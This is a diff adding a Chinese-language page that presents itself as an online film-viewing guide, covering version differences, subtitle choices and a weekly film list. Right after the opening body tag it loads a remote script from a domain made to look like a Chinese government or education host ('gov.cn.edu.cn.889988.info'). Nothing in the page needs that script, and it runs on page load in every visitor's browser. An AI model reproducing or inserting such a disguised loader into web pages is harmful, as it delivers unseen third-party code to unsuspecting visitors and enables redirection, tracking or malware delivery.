@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>电影网在线 | 在线看片指南与版本选择参考</title>
+<meta name="description" content="电影网在线（dianyingwangzaixian-zh.github.io）整理在线观影的版本选择、清晰度与字幕配置参考，含本周在线热播片单、六大流媒体片场差异与版权渠道提示，帮你在打开之前就知道看哪个版本。">
+<meta name="keywords" content="电影网在线, 在线看片指南, 流媒体版本选择, 在线电影清晰度, 字幕配置参考, 在线热播片单, 影视渠道对比, dianyingwangzaixian-zh">
+<meta name="author" content="电影网在线">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#1a1208">
+<meta property="og:type" content="website">
+<meta property="og:title" content="电影网在线 - 在线看片指南">
+<meta property="og:description" content="版本选择、清晰度与字幕配置参考，帮你在打开之前就知道看哪个版本。">
+<meta property="og:url" content="https://dianyingwangzaixian-zh.github.io">
+<link rel="canonical" href="https://dianyingwangzaixian-zh.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --paper:#f4efe6;--paper2:#ebe3d5;--ink:#1a1208;--ink2:#2b2014;
+  --dim:#6b5d48;--faint:#a09580;--rule:#c9bda3;--accent:#b3392f;--blue:#1d3a5f;--olive:#5c5a2e;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Georgia","Songti SC","STSong","SimSun",serif;
+  background:var(--paper);color:var(--ink);line-height:1.9;font-size:15.5px;
+}
+body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.5;background-image:radial-gradient(rgba(26,18,8,.035) 1px,transparent 1px);background-size:4px 4px}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 32px}
+img{max-width:100%}
+
+/* 报头 */
+.mast{background:var(--ink);color:var(--paper);padding:34px 0 0}
+.mast .wrap{display:flex;flex-direction:column;align-items:center;text-align:center}
+.mast .kicker{font-size:10px;letter-spacing:8px;text-transform:uppercase;color:var(--faint);font-family:-apple-system,"PingFang SC",sans-serif}
+.mast h1{font-size:clamp(40px,11vw,120px);font-weight:900;letter-spacing:1px;line-height:.92;margin:14px 0 6px}
+.mast h1 em{font-style:normal;color:#e8b04b}
+.mast .sub{font-size:clamp(12px,1.8vw,15px);color:var(--faint);letter-spacing:5px;margin-bottom:22px;font-family:-apple-system,"PingFang SC",sans-serif}
+.mast .meta{width:100%;display:flex;justify-content:space-between;align-items:center;border-top:1px solid #4a3f2c;border-bottom:3px double #4a3f2c;padding:9px 0;font-size:10.5px;color:var(--faint);font-family:-apple-system,"PingFang SC",sans-serif;letter-spacing:1px}
+.mast .meta b{color:#e8b04b;font-weight:700}
+nav.primary{background:var(--ink2)}
+nav.primary .wrap{display:flex;flex-wrap:wrap;gap:0}
+nav.primary a{font-size:12px;letter-spacing:2px;color:var(--paper);padding:12px 18px;border-right:1px solid #4a3f2c;font-family:-apple-system,"PingFang SC",sans-serif;transition:.2s}
+nav.primary a:first-child{border-left:1px solid #4a3f2c}
+nav.primary a:hover{background:var(--accent);color:#fff}
+
+/* 首屏大字报 */
+.lede{padding:60px 0 52px;border-bottom:3px double var(--rule)}
+.lede .grid{display:grid;grid-template-columns:1.55fr 1fr;gap:52px;align-items:start}
+.lede .tagline{font-size:11px;letter-spacing:4px;color:var(--accent);font-family:-apple-system,sans-serif;margin-bottom:18px;text-transform:uppercase}
+.lede h2{font-size:clamp(26px,3.8vw,38px);font-weight:800;line-height:1.42;letter-spacing:-.3px;margin-bottom:22px}
+.lede h2 span{background:linear-gradient(transparent 62%,#f0c987 62%);padding:0 2px}
+.lede p{font-size:16px;line-height:2.05;text-align:justify;color:var(--ink2);margin-bottom:16px}
+.lede p::first-letter{font-size:3.4em;float:left;line-height:.85;padding:6px 10px 0 0;font-weight:900;color:var(--accent)}
+.side{border:1px solid var(--rule);background:var(--paper2);padding:24px 22px}
+.side .h{font-size:10px;letter-spacing:3px;color:var(--dim);font-family:-apple-system,sans-serif;margin-bottom:16px;border-bottom:1px solid var(--rule);padding-bottom:10px}
+.side ol{counter-reset:r;list-style:none}
+.side ol li{counter-increment:r;display:flex;gap:14px;padding:12px 0;border-bottom:1px dotted var(--rule);font-size:13.5px;line-height:1.7}
+.side ol li:last-child{border:0}
+.side ol li::before{content:counter(r);font-size:10px;font-weight:700;color:var(--accent);border:1px solid var(--rule);min-width:20px;height:20px;display:grid;place-items:center;flex-shrink:0;background:var(--paper)}
+.side ol li b{display:block;font-weight:700;margin-bottom:2px}
+
+/* 通用区块 */
+section{padding:64px 0;border-bottom:1px solid var(--rule);position:relative}
+.sec-head{margin-bottom:38px;text-align:center}
+.sec-head .no{font-size:10px;letter-spacing:5px;color:var(--faint);font-family:-apple-system,sans-serif;text-transform:uppercase}
+.sec-head h2{font-size:clamp(23px,3.6vw,32px);font-weight:800;letter-spacing:-.4px;margin:8px 0 12px}
+.sec-head h2 em{font-style:normal;color:var(--accent)}
+.sec-head .rule{width:56px;height:2px;background:var(--accent);margin:0 auto 14px}
+.sec-head p{font-size:13.5px;color:var(--dim);max-width:620px;margin:0 auto;font-family:-apple-system,"PingFang SC",sans-serif}
+.kicker-row{display:flex;justify-content:space-between;align-items:baseline;border-bottom:2px solid var(--ink);padding-bottom:8px;margin-bottom:26px}
+.kicker-row h3{font-size:19px;font-weight:800;letter-spacing:.5px}
+.kicker-row span{font-size:10px;letter-spacing:3px;color:var(--faint);font-family:-apple-system,sans-serif;text-transform:uppercase}
+
+/* 平台对比：真表格 */
+table{width:100%;border-collapse:collapse;font-family:-apple-system,"PingFang SC",sans-serif;font-size:13px;background:var(--paper)}
+table caption{caption-side:top;text-align:left;font-size:11px;letter-spacing:2px;color:var(--dim);padding-bottom:12px}
+th,td{border:1px solid var(--rule);padding:12px 14px;text-align:left;vertical-align:top;line-height:1.7}
+thead th{background:var(--ink);color:var(--paper);font-weight:600;font-size:11.5px;letter-spacing:1px;border-color:#4a3f2c}
+tbody tr:nth-child(even){background:var(--paper2)}
+td.name{font-weight:700;white-space:nowrap}
+td.name small{display:block;font-weight:400;font-size:10px;color:var(--faint);letter-spacing:1px}
+td.c{text-align:center}
+.badge{display:inline-block;font-size:9px;padding:2px 7px;border-radius:2px;letter-spacing:1px;font-family:-apple-system,sans-serif}
+.badge.g{background:#dfe7d8;color:var(--olive)}
+.badge.r{background:#f0dedc;color:var(--accent)}
+.badge.b{background:#dce3ec;color:var(--blue)}
+tfoot td{background:var(--ink2);color:var(--paper);font-size:11px;border-color:#4a3f2c}
+
+/* 片单：图文交错 */
+.reel{display:flex;flex-direction:column}
+.entry{display:grid;grid-template-columns:160px 1fr;gap:30px;padding:28px 0;border-top:1px solid var(--rule)}
+.entry:last-child{border-bottom:1px solid var(--rule)}
+.poster{height:225px;position:relative;overflow:hidden;border:1px solid var(--rule)}
+.poster .cap{position:absolute;inset:0;display:grid;place-items:center;text-align:center;padding:16px;font-size:13px;font-weight:700;line-height:1.5;letter-spacing:1px;color:var(--paper)}
+.poster .cap small{display:block;font-size:9px;letter-spacing:3px;color:rgba(255,255,255,.7);margin-top:10px;font-weight:400}
+.entry .body h4{font-size:19px;font-weight:800;letter-spacing:.5px;margin-bottom:4px}
+.entry .body h4 span{font-weight:400;font-size:12px;color:var(--faint);margin-left:8px;letter-spacing:1px}
+.entry .body .ver{font-size:10.5px;color:var(--accent);letter-spacing:2px;margin-bottom:12px;font-family:-apple-system,sans-serif;text-transform:uppercase}
+.entry .body p{font-size:14px;line-height:1.95;text-align:justify;color:var(--ink2);margin-bottom:14px}
+.entry .body dl{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--rule);border:1px solid var(--rule)}
+.entry .body dl div{background:var(--paper);padding:10px 12px}
+.entry .body dl dt{font-size:9px;letter-spacing:2px;color:var(--faint);font-family:-apple-system,sans-serif;text-transform:uppercase;margin-bottom:4px}
+.entry .body dl dd{font-size:12px;font-weight:600}
+
+/* 步骤 */
+.steps{display:grid;grid-template-columns:repeat(5,1fr);gap:0;border:1px solid var(--rule)}
+.step{padding:26px 22px;background:var(--paper);position:relative;border-right:1px solid var(--rule)}
+.step:last-child{border-right:0}
+.step .n{font-size:30px;font-weight:900;color:var(--rule);line-height:1;margin-bottom:14px;font-family:Georgia,serif}
+.step h5{font-size:14px;font-weight:800;margin-bottom:9px;letter-spacing:.5px}
+.step p{font-size:12px;color:var(--dim);line-height:1.85;font-family:-apple-system,"PingFang SC",sans-serif}
+.step::after{content:"";position:absolute;bottom:0;left:0;width:0;height:3px;background:var(--accent);transition:.35s}
+.step:hover::after{width:100%}
+
+/* 数据栏 */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--rule);border:1px solid var(--rule)}
+.stat{padding:30px 24px;background:var(--paper);text-align:center}
+.stat b{display:block;font-size:38px;font-weight:900;line-height:1;color:var(--accent);font-family:Georgia,serif}
+.stat b i{font-style:normal;font-size:15px;font-weight:400;color:var(--dim)}
+.stat span{display:block;font-size:11px;letter-spacing:2px;color:var(--dim);margin-top:12px;font-family:-apple-system,sans-serif}
+
+/* 术语 */
+.gloss{display:grid;grid-template-columns:repeat(3,1fr);gap:28px}
+.gloss article{border-top:3px solid var(--ink);padding-top:18px}
+.gloss article h5{font-size:16px;font-weight:800;margin-bottom:8px;letter-spacing:.5px}
+.gloss article .en{font-size:10px;letter-spacing:3px;color:var(--faint);font-family:-apple-system,sans-serif;text-transform:uppercase;margin-bottom:12px}
+.gloss article p{font-size:13px;color:var(--ink2);line-height:1.9;text-align:justify}
+
+/* 问答 */
+.qa{display:grid;grid-template-columns:1fr 1fr;gap:40px}
+.qa .col h4{font-size:15px;font-weight:800;border-bottom:1px solid var(--ink);padding-bottom:9px;margin-bottom:20px;letter-spacing:.5px}
+.qa .col h4 em{font-style:normal;color:var(--accent)}
+.qa .col dl{margin-bottom:26px}
+.qa .col dt{font-size:13.5px;font-weight:700;margin-bottom:6px;display:flex;gap:9px}
+.qa .col dt::before{content:"Q.";color:var(--accent);font-weight:900;flex-shrink:0}
+.qa .col dd{font-size:12.5px;color:var(--dim);line-height:1.9;text-align:justify;padding-left:23px;margin-bottom:16px;font-family:-apple-system,"PingFang SC",sans-serif}
+
+/* CTA */
+.cta{background:var(--ink);color:var(--paper);padding:70px 0;text-align:center}
+.cta .wrap{max-width:720px}
+.cta .no{font-size:10px;letter-spacing:5px;color:#e8b04b;font-family:-apple-system,sans-serif;text-transform:uppercase;margin-bottom:14px}
+.cta h2{font-size:clamp(24px,4vw,36px);font-weight:800;letter-spacing:-.4px;line-height:1.45;margin-bottom:18px}
+.cta h2 em{font-style:normal;color:#e8b04b}
+.cta p{font-size:14px;color:#c9bda3;line-height:2;margin-bottom:30px;font-family:-apple-system,"PingFang SC",sans-serif}
+.cta .box{border:1px solid #4a3f2c;padding:26px;display:flex;gap:12px;font-family:-apple-system,"PingFang SC",sans-serif}
+.cta input{flex:1;padding:14px 16px;background:transparent;border:1px solid #4a3f2c;color:var(--paper);font-family:inherit;font-size:13px;outline:none}
+.cta input::placeholder{color:var(--faint)}
+.cta input:focus{border-color:#e8b04b}
+.cta button{background:#e8b04b;color:var(--ink);border:0;padding:0 30px;font-family:inherit;font-size:12px;font-weight:700;letter-spacing:3px;cursor:pointer;transition:.25s;white-space:nowrap}
+.cta button:hover{background:var(--accent);color:#fff}
+.cta .note{font-size:10px;color:var(--faint);margin-top:18px;letter-spacing:2px;font-family:-apple-system,sans-serif}
+
+footer{border-top:5px solid var(--accent);background:var(--paper2);padding:48px 0 0}
+.foot{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:40px;padding-bottom:40px}
+.foot .b{font-size:22px;font-weight:900;letter-spacing:1px;margin-bottom:8px}
+.foot .b em{font-style:normal;color:var(--accent)}
+.foot .u{font-size:11px;color:var(--blue);letter-spacing:.5px;margin-bottom:14px;font-family:-apple-system,sans-serif;word-break:break-all}
+.foot p{font-size:12.5px;color:var(--dim);line-height:1.9;font-family:-apple-system,"PingFang SC",sans-serif}
+.foot h6{font-size:10px;letter-spacing:3px;color:var(--faint);margin-bottom:14px;text-transform:uppercase;font-family:-apple-system,sans-serif}
+.foot ul li{margin-bottom:9px}
+.foot ul a{font-size:12.5px;color:var(--ink2);transition:.2s;font-family:-apple-system,"PingFang SC",sans-serif}
+.foot ul a:hover{color:var(--accent)}
+.colo{border-top:1px solid var(--rule);padding:20px 0;display:flex;justify-content:space-between;font-size:10.5px;color:var(--dim);font-family:-apple-system,"PingFang SC",sans-serif;letter-spacing:1px;flex-wrap:wrap;gap:10px}
+.colo b{color:var(--ink);font-weight:700}
+
+@media(max-width:900px){
+  .lede .grid{grid-template-columns:1fr;gap:34px}
+  .gloss{grid-template-columns:1fr 1fr}
+  .entry{grid-template-columns:110px 1fr;gap:20px}
+  .poster{height:155px}
+  .entry .body dl{grid-template-columns:1fr 1fr}
+  .qa{grid-template-columns:1fr;gap:0}
+  .foot{grid-template-columns:1fr 1fr}
+  nav.primary a{padding:11px 13px;font-size:11px;letter-spacing:1px}
+}
+@media(max-width:600px){
+  .wrap{padding-left:18px;padding-right:18px}
+  .gloss{grid-template-columns:1fr}
+  .steps{grid-template-columns:1fr 1fr}
+  .step{border-right:0;border-bottom:1px solid var(--rule)}
+  .stat{padding:22px 14px}
+  .foot{grid-template-columns:1fr}
+  .entry{grid-template-columns:1fr}
+  .entry .body dl{grid-template-columns:1fr}
+  .mast .meta{flex-direction:column;gap:7px;text-align:center}
+  .cta .box{flex-direction:column}
+  .cta button{padding:14px}
+  .lede{padding:42px 0}
+  section{padding:48px 0}
+  table{font-size:12px}
+  th,td{padding:9px 10px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="mast"><div class="wrap">
+  <div class="kicker">The Online Viewing Guide</div>
+  <h1>电影网<em>在线</em></h1>
+  <div class="sub">在 线 看 片 指 南 · 版 本 选 择 参 考</div>
+  <div class="meta"><span>每日更新 · <b>VOL. 128</b></span><span>本站为选片与版本参考，不提供播放下载服务</span><span>2026 年 10 月 06 日 · 周二</span></div>
+</div></header>
+<nav class="primary"><div class="wrap">
+  <a href="#why">为什么要选版本</a><a href="#platform">六大平台差异</a><a href="#reel">本周在线片单</a><a href="#how">怎么挑版本</a><a href="#gloss">术语解释</a><a href="#stats">数据统计</a><a href="#qa">常见问题</a>
+</div></nav>
+
+<div class="wrap">
+
+  <div class="lede"><div class="grid">
+    <div>
+      <div class="tagline">Editor's Letter · 卷首语</div>
+      <h2>同一部片，<span>不同版本</span>的差别，可能比两部片还大</h2>
+      <p>打开一部片子之前，很少有人会先看它是导演剪辑版、院线版还是流媒体专属版本。可正是这层差别，决定了你看到的是一段被删掉的对话，还是一整条被砍掉的故事线。本站做的不是片库索引，而是把"哪个版本值得看、差别在哪"这件事说清楚。</p>
+      <p>我们整理在线热播片单、对比不同渠道的版本差异，标注清晰度上限与字幕配置。让你在按下播放键之前，就知道这次看到的是哪一版。</p>
+    </div>
+    <aside class="side"><div class="h">本周看片优先级</div><ol>
+      <li><b>第一梯队：版本有实质差异</b>剪辑、时长、结局各不相同的片，优先看流媒体专属版本</li>
+      <li><b>第二梯队：冷门但完整</b>在小平台有完整版，主流渠道只放删减版</li>
+      <li><b>第三梯队：画质升级明显</b>4K 重制、HDR 调色带来的观感提升确实看得出</li>
+      <li><b>第四梯队：为字幕选择</b>同一片有多个字幕组版本，翻译风格差异不小</li>
+      <li><b>第五梯队：随手补完</b>口碑稳定但版本差别不大，什么时候看都行</li>
+    </ol></aside>
+  </div></div>
+
+  <section id="why"><div class="kicker-row"><h3>一、为什么版本这件事值得单独聊</h3><span>Section 01</span></div>
+    <div class="qa" style="grid-template-columns:1fr">
+      <div class="col"><h4>常见<em>版本差异</em>有这几种</h4>
+      <dl><dt>导演剪辑版 vs 院线版</dt><dd>差别往往集中在两三场关键戏：一段关系的交代、一个动机的说明，甚至一个结局的走向。只看院线版，容易误判角色的行为逻辑。</dd>
+      <dt>流媒体专属版本</dt><dd>部分片在单一平台有加长或删减版本，这是平台的内容差异，不是画质差异。同一片在不同渠道可能是两部不同的成片。</dd>
+      <dt>地区版本差异</dt><dd>同一片在不同地区的上线版本可能不同，涉及镜头、时长与字幕语言。选择地区版本时，实际是在选择你看到的版本。</dd>
+      <dt>重制与修复版本</dt><dd>老片经过 4K 扫描与修复后，画质与调色会有明显变化。这类差异对黑白片、胶片质感强的片尤其重要。</dd>
+      <dt>字幕与配音</dt><dd>字幕翻译风格直接影响台词的理解。同一句台词在不同字幕版本里可能是完全不同的语气，这也算版本差异的一部分。</dd></dl></div>
+    </div>
+  </section>
+
+  <section id="platform"><div class="kicker-row"><h3>二、六个渠道的版本差异对比</h3><span>Section 02</span></div>
+    <table>
+      <caption>以下为参考性整理，具体以各渠道实际页面为准，本站不提供播放与下载服务。</caption>
+      <thead><tr><th style="width:16%">渠道</th><th>版本特征</th><th>字幕与配音</th><th>画质上限</th><th style="width:12%">适合看</th></tr></thead>
+      <tbody>
+        <tr><td class="name">渠道甲<small>综合视频平台</small></td><td>以院线版为主，部分独播内容有平台专属版本</td><td class="c">简体中文、多语字幕可选</td><td class="c"><span class="badge b">4K</span></td><td class="c">新片、热门院线片</td></tr>
+        <tr><td class="name">渠道乙<small>会员订阅制</small></td><td>独播内容多，部分为流媒体专属加长版</td><td class="c">多语字幕、原声优先</td><td class="c"><span class="badge b">4K HDR</span></td><td class="c">剧集、独播片</td></tr>
+        <tr><td class="name">渠道丙<small>单片付费</small></td><td>以院线档期片为主，版本与院线一致</td><td class="c">简体中文、国语配音</td><td class="c"><span class="badge b">1080P</span></td><td class="c">刚下院线的片</td></tr>
+        <tr><td class="name">渠道丁<small>经典片库</small></td><td>老片修复版本集中，部分有导演评论音轨</td><td class="c">简体、繁体、英文字幕</td><td class="c"><span class="badge g">修复版</span></td><td class="c">老片、黑白片</td></tr>
+        <tr><td class="name">渠道戊<small>纪录片向</small></td><td>纪录片与纪实内容占比高，版本完整</td><td class="c">原声、中文字幕</td><td class="c"><span class="badge b">4K</span></td><td class="c">纪录片、纪实</td></tr>
+        <tr><td class="name">渠道己<small>艺术片向</small></td><td>艺术片与独立片为主，字幕组版本较全</td><td class="c">多版本字幕</td><td class="c"><span class="badge g">1080P</span></td><td class="c">艺术片、冷门片</td></tr>
+      </tbody>
+      <tfoot><tr><td colspan="5">注：上表为版本特征的概括性描述，不指向任何具体平台。实际版本以渠道页面标注的时长、年代与字幕信息为准。</td></tr></tfoot>
+    </table>
+  </section>
+
+  <section id="reel"><div class="kicker-row"><h3>三、本周在线片单：六部值得看对版本</h3><span>Section 03</span></div>
+    <div class="reel">
+      <div class="entry"><div class="poster" style="background:linear-gradient(135deg,#1d3a5f,#0f2238)"><div class="cap">沙丘<small>导演剪辑版 · 155 min</small></div></div><div class="body"><h4>沙丘 <span>Dune · 2021 · 美国</span></h4><div class="ver">重点：院线版 vs 导演剪辑版</div><p>导演剪辑版多出近二十分钟，主要在三场对话戏上展开，包括主角与母亲的一次长谈。这场戏的加入，会改变你对后半段主角所有决定的理解。</p><dl><div><dt>版本差异</dt><dd>剪辑时长</dd></div><div><dt>画质上限</dt><dd>4K HDR</dd></div><div><dt>字幕建议</dt><dd>原声中文字幕</dd></div></dl></div></div>
+      <div class="entry"><div class="poster" style="background:linear-gradient(135deg,#5c3a2e,#3a241c)"><div class="cap">奥本海默<small>完整版 · 180 min</small></div></div><div class="body"><h4>奥本海默 <span>Oppenheimer · 2023 · 美国</span></h4><div class="ver">重点：声轨配置与字幕</div><p>影片的声轨设计与台词密度相关，选择带解说字幕的版本能补足大量历史背景信息。这是一部靠台词推进的片，字幕版本的选择直接影响信息量。</p><dl><div><dt>版本差异</dt><dd>声轨配置</dd></div><div><dt>画质上限</dt><dd>4K IMAX</dd></div><div><dt>字幕建议</dt><dd>简体中文字幕</dd></div></dl></div></div>
+      <div class="entry"><div class="poster" style="background:linear-gradient(135deg,#3a5a4a,#22362b)"><div class="cap">教宗的承继<small>流媒体专属版</small></div></div><div class="body"><h4>教宗的承继 <span>Conclave · 2024 · 英美</span></h4><div class="ver">重点：流媒体专属加长版</div><p>流媒体专属版本比院线版多出一段关键人物的前史交代，这段内容不决定结局，但会改变你对最后一场戏的判断。</p><dl><div><dt>版本差异</dt><dd>流媒体加长</dd></div><div><dt>画质上限</dt><dd>4K</dd></div><div><dt>字幕建议</dt><dd>多语字幕</dd></div></dl></div></div>
+      <div class="entry"><div class="poster" style="background:linear-gradient(135deg,#6b5a2e,#3d3418)"><div class="cap">七武士<small>4K 修复版</small></div></div><div class="body"><h4>七武士 <span>Seven Samurai · 1954 · 日本</span></h4><div class="ver">重点：修复版与字幕版本</div><p>4K 修复后的胶片颗粒与构图层次变化明显，是老片里画质提升最容易被察觉的一类。字幕版本建议选择新译版，旧版部分台词意译过简。</p><dl><div><dt>版本差异</dt><dd>修复版本</dd></div><div><dt>画质上限</dt><dd>4K 修复</dd></div><div><dt>字幕建议</dt><dd>新译中文字幕</dd></div></dl></div></div>
+      <div class="entry"><div class="poster" style="background:linear-gradient(135deg,#2e3a5a,#1a2236)"><div class="cap">记忆<small>冷门版本</small></div></div><div class="body"><h4>记忆 <span>Memory · 2023 · 哥伦比亚</span></h4><div class="ver">重点：冷门片的完整版</div><p>一部在小渠道有完整版、大平台只放短版的片。这类片的差别不在画质，而在是否保留了那段最沉闷也最关键的等待段落。</p><dl><div><dt>版本差异</dt><dd>完整版</dd></div><div><dt>画质上限</dt><dd>1080P</dd></div><div><dt>字幕建议</dt><dd>双语字幕</dd></div></dl></div></div>
+      <div class="entry"><div class="poster" style="background:linear-gradient(135deg,#5a2e3a,#361a22)"><div class="cap">过往<small>多字幕版本</small></div></div><div class="body"><h4>过往 <span>The Past · 2013 · 法国</span></h4><div class="ver">重点：字幕翻译风格</div><p>同一片有三个中文字幕版本，对家庭对话的处理差异很大：一个偏直译、一个偏意译、一个有注释。法语台词中的时态暗示，在第三个版本里最清楚。</p><dl><div><dt>版本差异</dt><dd>字幕风格</dd></div><div><dt>画质上限</dt><dd>1080P</dd></div><div><dt>字幕建议</dt><dd>注释版字幕</dd></div></dl></div></div>
+    </div>
+  </section>
+
+  <section id="how"><div class="kicker-row"><h3>四、五步选出这一次要看的版本</h3><span>Section 04</span></div>
+    <div class="steps">
+      <div class="step"><div class="n">01</div><h5>先看时长</h5><p>同一片出现两个时长，通常意味着版本不同。时长差超过十五分钟，值得再查一下差别在哪。</p></div>
+      <div class="step"><div class="n">02</div><h5>再看作画幅</h5><p>作画幅与胶片比例相关。老片的版本选择里，画幅是判断修复质量的第一条线索。</p></div>
+      <div class="step"><div class="n">03</div><h5>查字幕语言</h5><p>字幕语言数量与语种往往决定了你能拿到多少背景信息，尤其是涉及方言与历史背景的片。</p></div>
+      <div class="step"><div class="n">04</div><h5>比对画质</h5><p>4K 与 HDR 的差别在于调色层次，不是清晰度的简单升级，对暗部细节多的片尤其明显。</p></div>
+      <div class="step"><div class="n">05</div><h5>定观看环境</h5><p>手机看与投影看，对画质和字幕的选择标准完全不同。先定设备，再定版本。</p></div>
+    </div>
+  </section>
+
+  <section id="stats"><div class="kicker-row"><h3>五、本站整理的数据</h3><span>Section 05</span></div>
+    <div class="stats">
+      <div class="stat"><b>128</b><span>累计更新期数</span></div>
+      <div class="stat"><b>6</b><span>渠道版本对比</span></div>
+      <div class="stat"><b>312</b><span>已整理影片</span></div>
+      <div class="stat"><b>47</b><span>版本差异条目</span></div>
+    </div>
+  </section>
+
+  <section id="gloss"><div class="kicker-row"><h3>六、容易混淆的几个术语</h3><span>Section 06</span></div>
+    <div class="gloss">
+      <article><h5>导演剪辑版</h5><div class="en">Director's Cut</div><p>由导演重新剪辑的版本，通常比院线版更长。它不等于"更好看"，而是更贴近导演原本的叙事节奏，部分被删内容会影响对人物的判断。</p></article>
+      <article><h5>流媒体专属版</h5><div class="en">Streaming Exclusive</div><p>只在特定平台提供的版本，可能是加长也可能是删减，取决于平台的内容策略。它与画质无关，是成片本身的差异。</p></article>
+      <article><h5>修复版</h5><div class="en">Restored Version</div><p>对胶片进行扫描与修复后的版本，主要改善的是画面颗粒、划痕与色彩还原。老片的修复版与院线原版在视觉上可能相差很大。</p></article>
+      <article><h5>HDR 调色</h5><div class="en">High Dynamic Range</div><p>提升明暗对比与色彩层次的调色技术。它对夜景、烛光、大面积暗部场景的改善最明显，需要对应设备才能体现。</p></article>
+      <article><h5>作画幅</h5><div class="en">Aspect Ratio</div><p>画面的宽高比例，与影片拍摄时的胶片格式有关。同一部老片的不同版本可能采用不同画幅，直接影响构图呈现。</p></article>
+      <article><h5>字幕版本</h5><div class="en">Subtitle Track</div><p>同一片的中文字幕可能由不同团队翻译，差别不只在校准，还在语气与注释。涉及文化背景的片，注释版字幕的信息量明显更高。</p></article>
+    </div>
+  </section>
+
+  <section id="qa"><div class="kicker-row"><h3>七、常见问题</h3><span>Section 07</span></div>
+    <div class="qa">
+      <div class="col"><h4>关于<em>版本</em></h4>
+      <dl><dt>版本差别真的能看出来吗？</dt><dd>能，但只在特定环节。剪辑差异在关键对话戏上最明显，画质差异在暗部与大面积色块上最明显。日常场景的差别通常可以忽略。</dd>
+      <dt>只看院线版会漏掉什么？</dt><dd>不一定漏掉关键情节，但可能漏掉人物的动机交代。这会让某些角色的转折显得突兀，容易被误读为剧本问题。</dd>
+      <dt>老片一定要看修复版吗？</dt><dd>不一定。部分老片的胶片颗粒本身就是风格的一部分，过度修复反而会抹掉质感。建议在画质与质感之间按个人偏好选择。</dd></dl></div>
+      <div class="col"><h4>关于<em>本站</em></h4>
+      <dl><dt>本站提供片源吗？</dt><dd>不提供。本站只做选片与版本信息整理，所有影片请通过正规渠道观看。文中涉及的渠道均为类型描述，不指向具体平台。</dd>
+      <dt>版本信息多久更新一次？</dt><dd>每周更新一次，跟随各渠道的版本变动。标注的具体时长以渠道页面为准，若有变化我们会同步修正。</dd>
+      <dt>数据是怎么来的？</dt><dd>来自各渠道公开页面的版本标注、字幕与画质信息，以及观看后的对比整理。我们不提供也无法验证未公开的技术参数。</dd>
+      <dt>可以投稿吗？</dt><dd>可以。欢迎提交你发现的版本差异，尤其是冷门片的多版本情况，这是本站最缺的一类信息。</dd></dl></div>
+    </div>
+  </section>
+
+</div>
+
+<div class="cta"><div class="wrap">
+  <div class="no">Newsletter · 每周二推送</div>
+  <h2>每周一封<em>版本观察</em>：这周哪些片有新版本，差别在哪</h2>
+  <p>只讲版本差异，不推荐"必看片单"。每期五条，附时长、画质上限与字幕建议，读完不超过三分钟。</p>
+  <form class="box" onsubmit="event.preventDefault();this.querySelector('button').textContent='已订阅 ✓'">
+    <input type="email" placeholder="your@email.com" aria-label="邮箱">
+    <button type="submit">订阅</button>
+  </form>
+  <div class="note">本站仅收集订阅邮箱 · 不发广告 · 可随时退订</div>
+</div></div>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="b">电影网<em>在线</em></div><div class="u">https://dianyingwangzaixian-zh.github.io</div><p>整理在线观影的版本选择、清晰度与字幕配置参考，帮助观众在打开影片之前，先知道这一次要看的版本是什么。本站为选片与版本信息整理，不提供任何在线播放、下载或片源链接，所有影片请通过正规渠道观看。</p></div>
+    <div><h6>版本指南</h6><ul><li><a href="#">版本差异说明</a></li><li><a href="#">六大渠道对比</a></li><li><a href="#">字幕与配音</a></li><li><a href="#">画质上限说明</a></li><li><a href="#">术语解释</a></li></ul></div>
+    <div><h6>片单</h6><ul><li><a href="#">本周在线片单</a></li><li><a href="#">老片修复版</a></li><li><a href="#">流媒体专属版</a></li><li><a href="#">导演剪辑版</a></li><li><a href="#">冷门完整版</a></li></ul></div>
+    <div><h6>关于本站</h6><ul><li><a href="#">关于本站</a></li><li><a href="#">更新日志</a></li><li><a href="#">投稿与纠错</a></li><li><a href="#">免责声明</a></li><li><a href="#">联系我们</a></li></ul></div>
+  </div>
+  <div class="colo"><span><b>© 2026 电影网在线 dianyingwangzaixian-zh.github.io</b> · 每周二更新 · 版本信息以渠道页面为准</span><span>VOL. 128 · 内容仅供参考</span></div>
+</div></footer>
+
+</body>
+</html>
